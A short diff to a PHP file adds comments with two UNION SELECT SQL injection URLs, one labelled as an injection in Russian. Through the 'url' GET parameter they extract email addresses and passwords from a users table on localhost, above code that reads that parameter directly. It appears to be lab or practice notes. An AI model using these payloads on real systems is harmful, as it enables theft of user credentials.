@@ -1,4 +1,7 @@
 <?php
+///sql иньекция http://localhost/index.php?url=0' UNION SELECT email,email,email,email,email,email,email FROM users WHERE id>'0
+//http://localhost/index.php?url=0' UNION SELECT password,password,password,password,password,password,password FROM users WHERE id>'0
+
 
 if($_GET['url']){
 	$url=$_GET['url'];
